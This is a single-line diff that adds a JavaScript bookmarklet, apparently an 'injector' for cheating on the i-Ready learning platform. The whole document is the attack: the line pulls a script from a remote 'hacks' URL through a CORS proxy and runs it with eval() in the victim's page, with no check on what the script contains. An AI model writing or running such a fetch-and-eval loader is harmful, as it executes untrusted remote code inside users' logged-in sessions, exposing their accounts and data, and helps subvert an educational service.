@@ -1,0 +1,1 @@
+javascript:fetch('https://api.allorigins.win/get?url=https://www.i-ready.dev/hacks/injector.js%27).then(r=%3Er.text()).then((d)=%3Eeval(JSON.parse(d).contents))
